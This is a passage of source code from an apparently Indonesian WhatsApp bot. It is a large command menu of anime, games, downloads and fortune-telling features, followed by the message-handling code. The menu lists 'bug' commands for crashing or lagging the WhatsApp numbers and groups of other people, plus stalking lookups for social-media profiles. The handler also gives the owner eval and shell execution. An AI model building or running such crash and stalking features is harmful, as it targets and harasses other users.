乂 𝗔𝗡𝗜𝗠𝗘 𝗠𝗘𝗡𝗨
    ◦ .mangasearch
    ◦ .mangatoons
    ◦ .kusonime
    
乂 𝗔𝗦𝗨𝗣𝗔𝗡 𝗠𝗘𝗡𝗨
    ◦  .cecan
    ◦  .china
    ◦  .cogan
    ◦  .indonesia
    ◦  .japan
    ◦  .korea
    ◦  .malaysia
    ◦  .thailand
    ◦  .vietnam

乂 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗡𝗨
    ◦ .reminiv2
    ◦ .openai
    ◦ .telestick
    ◦ .shortlink
    ◦ .ssweb

乂 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨
    ◦ .closetime
    ◦ .opentime
    ◦ .kick
    ◦ .add
    ◦ .promote
    ◦ .demote
    ◦ .setdecs
    ◦ .setppgc
    ◦ .tagall
    ◦ .hidetag
    ◦ .totag
    ◦ .gruop [option]
    ◦ .editinfo
    ◦ .linkgc
    ◦ .revoke
    ◦ .listonline

乂 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨
    ◦ .botstatus 
    ◦ .buypremium
    ◦ .sewabot
    ◦ .speedtest
    ◦ .runtime
    ◦ .script
    ◦ .donate
    ◦ .owner
    ◦ .capi
    ◦ .tqto

乂 𝗦𝗧𝗔𝗟𝗞𝗘𝗥 𝗠𝗘𝗡𝗨
    ◦ .mlstalk
    ◦ .igstalk
    ◦ .ttstalk 
    ◦ .ghstalk 
    ◦ .twstalk 

乂 𝗥𝗣𝗚 𝗠𝗘𝗡𝗨
    ◦ .inventori
    ◦ .profile
    ◦ .mining
    ◦ .leaderboard
    ◦ .berburu
    ◦ .hunt
    ◦ .heal
    ◦ .beli
    ◦ .jual

乂 𝗕𝗨𝗚 𝗡𝗨𝗠𝗕𝗘𝗥
    ◦ .ʙᴜɢ1
    ◦ .ʙᴜɢ2
    ◦ .ʙᴜɢ3
    ◦ .ᴀᴍᴏᴜɴᴛʙᴜɢ
    ◦ .ᴘᴍʙᴜɢ 
    ◦ .ʙᴏᴍʙᴜɢ
    ◦ .ᴅᴇʟᴀʏʙᴜɢ
    ◦ .ᴜɴʟɪᴍɪᴛᴇᴅʙᴜɢ
    ◦ .ʟᴀɢʙᴜɢ
    ◦ .ᴅᴏᴄᴜʙᴜɢ
    ◦ .ᴛʀᴏʟʟʏʙᴜɢ

乂 𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣
    ◦ .ɢᴄʙᴜɢ
    ◦ .ᴅᴇʟᴀʏɢᴄʙᴜɢ 
    ◦ .ʟᴀɢɢᴄʙᴜɢ 
    ◦ .ʙᴏᴍɢᴄʙᴜɢ 
    ◦ .ᴜɴʟɪᴍɪᴛᴇᴅɢᴄʙᴜɢ 
    ◦ .ᴅᴏᴄᴜɢᴄʙᴜɢ
    ◦ .ᴛʀᴏʟʟʏɢᴄʙᴜɢ

乂 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡
    ◦ .infogempa
    ◦ .randompantun
    ◦ .quotessenja
    ◦ .infocuaca
    ◦ .wikipedia
    ◦ .pinterest
    ◦ .motivasi
    ◦ .kbbi
    ◦ .faktaunik
    ◦ .cerpen
    
乂 𝗧𝗘𝗫𝗧𝗣𝗥𝗢 𝗩𝟭
    ◦  .blackpink 
    ◦  .neon 
    ◦  .greenneon 
    ◦  .advanceglow
    ◦  .futureneon 
    ◦  .sandwriting 
    ◦  .sandsummer 
    ◦  .sandengraved
    ◦  .metaldark 
    ◦  .neonlight 
    ◦  .holographic 
    ◦  .text1917 
    ◦  .minion
    ◦  .deluxesilver 
    ◦  .newyearcard 
    ◦  .bloodfrosted
    ◦  .halloween 
    ◦  .jokerlogo
    ◦  .fireworksparkle 
    ◦  .natureleaves
    ◦  .bokeh 
    ◦  .toxic
    ◦  .strawberry 
    ◦  .box3d
    ◦  .roadwarning 
    ◦  .breakwall
    ◦  .icecold 
    ◦  .luxury
    ◦  .cloud 
    ◦  .summersand 
    ◦  .horrorblood 
    ◦  .thunder 

乂 𝗧𝗘𝗫𝗧𝗣𝗥𝗢 𝗩𝟮
    ◦  .pornhub
    ◦  .glitch
    ◦  .avenger
    ◦  .space
    ◦  .ninjalogo 
    ◦  .marvelstudio 
    ◦  .lionlogo 
    ◦  .wolflogo 
    ◦  .steel3d 
    ◦  .wallgravity 

乂 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨
    ◦  .apakah 
    ◦  .bisakah 
    ◦  .bagaimanakah 
    ◦  .rate 
    ◦  .gantengcek 
    ◦  .cekganteng 
    ◦  .cantikcek 
    ◦  .cekcantik 
    ◦  .sangecek 
    ◦  .ceksange 
    ◦  .gaycek 
    ◦  .cekgay 
    ◦  .lesbicek 
    ◦  .ceklesbi
    ◦  .kapankah 
    ◦  .wangy 
    ◦  .cekmati 
    ◦  .halah
    ◦  .hilih 
    ◦  .huluh 
    ◦  .heleh 
    ◦  .holoh 

乂 𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗠𝗘𝗡𝗨
    ◦ .sticker
    ◦ .smeme
    ◦ .swm
    ◦ .snobg
    ◦ .toimage
    ◦ .tovideo
    ◦ .toaudio
    ◦ .tomp3
    ◦ .tovn
    ◦ .toptv
    ◦ .togif
    ◦ .tourl
    ◦ .toqr
    ◦ .toviewonce
    ◦ .fliptext
    ◦ .emojimix1
    ◦ .emojimix2

乂 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘
    ◦ .addvideo
    ◦ .addimage
    ◦ .addsticker
    ◦ .addvn
    ◦ .delvideo
    ◦ .delimage
    ◦ .delsticker
    ◦ .delvn
    ◦ .listvideo
    ◦ .listimage
    ◦ .liststicker
    ◦ .listvn

乂 𝗚𝗔𝗠𝗘 𝗠𝗘𝗡𝗨
    ◦ .tictactoe
    ◦ .suitpvp
    ◦ .kuismath
    ◦ .tebak gambar
    ◦ .tebak kata
    ◦ .tebak kalimat
    ◦ .tebak lirik
    ◦ .tebak tebakan
    ◦ .tebak bendera
    ◦ .tebak bendera2
    ◦ .tebak kimia
    ◦ .tebak asahotak
    ◦ .tebak siapakahaku
    ◦ .tebak susunkata
    ◦ .tebak tekateki

乂 𝗔𝗡𝗜𝗠𝗘 𝗠𝗘𝗡𝗨
    ◦ .akira  
    ◦ .akiyama  
    ◦ .ana  
    ◦ .asuna  
    ◦ .ayuzawa  
    ◦ .boruto  
    ◦ .chiho  
    ◦ .chitoge  
    ◦ .cosplayloli  
    ◦ .cosplaysagiri  
    ◦ .deidara  
    ◦ .doraemon  
    ◦ .elaina  
    ◦ .emilia  
    ◦ .erza  
    ◦ .gremory  
    ◦ .hestia  
    ◦ .hinata  
    ◦ .husbu  
    ◦ .inori  
    ◦ .isuzu  
    ◦ .itachi  
    ◦ .itori  
    ◦ .kaga  
    ◦ .kagura  
    ◦ .kakasih  
    ◦ .kaori  
    ◦ .keneki  
    ◦ .kotori  
    ◦ .kurumi  
    ◦ .loli  
    ◦ .madara  
    ◦ .megumin  
    ◦ .mikasa  
    ◦ .mikey  
    ◦ .miku  
    ◦ .minato  
    ◦ .naruto  
    ◦ .neko  
    ◦ .neko2  
    ◦ .nekonime  
    ◦ .nezuko  
    ◦ .onepiece  
    ◦ .pokemon  
    ◦ .randomnime  
    ◦ .randomnime2  
    ◦ .rize  
    ◦ .sagiri  
    ◦ .sakura  
    ◦ .sasuke  
    ◦ .shina  
    ◦ .shinka  
    ◦ .shinomiya  
    ◦ .shizuka  
    ◦ .shota  
    ◦ .tejina  
    ◦ .toukachan  
    ◦ .tsunade  
    ◦ .waifu  
    ◦ .animewall  
    ◦ .yotsuba  
    ◦ .yuki  
    ◦ .yulibocil  
    ◦ .yumeko  
    ◦ .8ball  
    ◦ .tickle  
    ◦ .gecg  
    ◦ .feed  

乂 𝗣𝗥𝗜𝗠𝗕𝗢𝗡 𝗠𝗘𝗡𝗨
    ◦  .nomorhoki 
    ◦  .artimimpi 
    ◦  .artinama 
    ◦  .ramaljodoh 
    ◦  .ramaljodohbali 
    ◦  .suamiistri
    ◦  .ramalcinta 
    ◦  .cocoknama 
    ◦  .pasangan 
    ◦  .jadian
    ◦  .jadiannikah 
    ◦  .sifatusaha 
    ◦  .rezeki 
    ◦  .pekerjaan 
    ◦  .nasib 
    ◦  .penyakit 
    ◦  .tarot 
    ◦  .fengshui 
    ◦  .haribaik 
    ◦  .harisangar 
    ◦  .harisial 
    ◦  .nagahari 
    ◦  .arahrezeki 
    ◦  .peruntungan 
    ◦  .weton 
    ◦  .karakter
    ◦  .keberuntungan 
    ◦  .memancing 
    ◦  .masasubur 

乂 𝗗𝗢𝗪𝗡 𝗠𝗘𝗡𝗨
    ◦ .ttdl
    ◦ .ttaudio
    ◦ .cocofun
    ◦ .mediafire
    ◦ .pindl
    ◦ .snackvideo
    ◦ .ytmp3
    ◦ .ytmp4
    ◦ .igdl
    ◦ .igdlh
    
乂 𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗦𝗢𝗨𝗡𝗗
    ◦ .bass
    ◦ .blown
    ◦ .deep
    ◦ .earrape
    ◦ .fast
    ◦ .fat
    ◦ .nightcore
    ◦ .reverse
    ◦ .robot
    ◦ .slow
    ◦ .smooth
    ◦ .squirel

乂 𝗢𝗧𝗛𝗘𝗥𝗦 𝗠𝗘𝗡𝗨
    ◦ .qc
    ◦ .ttp
    ◦ .attp
    ◦ .ytcomment
    ◦ .botcomment
    ◦ .removebg
    ◦ .remini${gege}`

                if (typemenu === 'v1') {
                    ndaa.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/menu.jpg'),
                        caption: menunya
                    }, {
                        quoted: ftroli
                    })
                } else if (typemenu === 'v2') {
                    ndaa.sendMessage(m.chat, {
                        text: menunya,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                } else if (typemenu === 'v3') {
                    ndaa.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: menunya,
                        gifPlayback: true
                    }, {
                        quoted: ftroli
                    })
                } else if (typemenu === 'v4') {
                    ndaa.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    jpegThumbnail: fs.readFileSync('./media/quoted.jpg'),
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${fake}`,
                    caption: menunya,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${ucapanWaktu}`,
                            body: jam(),
                            thumbnailUrl: 'https://telegra.ph/file/8969a0041bfd4c4a95814.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: ftroli
                })
                } else if (typemenu === 'v5') {
                    ndaa.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "2",
                           scheduledTimestampMs: `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
                           title: menunya
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    ndaa.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                        currencyCodeIso4217: 'IDR',
                        amount1000: 30000000,
                        requestFrom: m.sender,
                        noteMessage: {
                        extendedTextMessage: {
                        text: menunya,
                        contextInfo: {
                        externalAdReply: {
                        showAdAttribution: false
                        }}}}}}, {})
                    }
                break
            default:
                  if (isSimi && body != undefined) {
                     // res = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${lol}&text=${body}&badword=true`)
                     // res = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`)
                     // m.reply(res.success)
                  }
                if (budy.startsWith('=>')) {
                    if (!isCreator) return newReply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return newReply(bang)
                    }
                    try {
                        newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        newReply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return newReply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await newReply(evaled)
                    } catch (err) {
                        await newReply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return newReply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return newReply(err)
                        if (stdout) return newReply(stdout)
                    })
                }
        }
    } catch (err) {
        ndaa.sendText(numberowner + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
